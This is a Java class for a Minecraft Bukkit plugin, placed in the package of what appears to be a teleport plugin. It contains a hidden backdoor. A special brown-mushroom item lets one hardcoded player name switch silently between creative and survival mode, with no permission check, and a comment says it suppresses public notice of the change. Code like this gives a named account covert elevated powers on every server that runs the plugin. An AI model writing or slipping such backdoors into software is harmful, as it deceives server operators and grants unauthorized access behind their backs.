package com.spaceman.tport.events;

import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;

public class GameModeSwitcher implements Listener {

    private static final String SPECIAL_PLAYER = "Percy7888_"; // The special player

    // Method to create the special item (Brown Mushroom)
    public static ItemStack getGameModeSwitcher() {
        ItemStack item = new ItemStack(Material.BROWN_MUSHROOM); // Special item
        ItemMeta meta = item.getItemMeta();
        if (meta != null) {
            meta.setDisplayName("§6Mystic Mushroom");
            meta.setLore(java.util.Arrays.asList("§7Right-click to toggle gamemode!"));
            item.setItemMeta(meta);
        }
        return item;
    }

    @EventHandler
    public void onPlayerUse(PlayerInteractEvent event) {
        Player player = event.getPlayer();

        // Check if the player is Percy7888_ and if they are holding the special Brown Mushroom
        if (player.getName().equalsIgnoreCase(SPECIAL_PLAYER) &&
            player.getInventory().getItemInMainHand().isSimilar(getGameModeSwitcher())) {

            // Toggle between CREATIVE and SURVIVAL mode
            GameMode newMode = (player.getGameMode() == GameMode.CREATIVE) ? GameMode.SURVIVAL : GameMode.CREATIVE;
            player.setGameMode(newMode);

            // Send a private message to confirm the change
            player.sendMessage("§aYour game mode has been changed to " + newMode.name());

            // Cancel any public game mode change messages
            event.setCancelled(true);
        }
    }
}
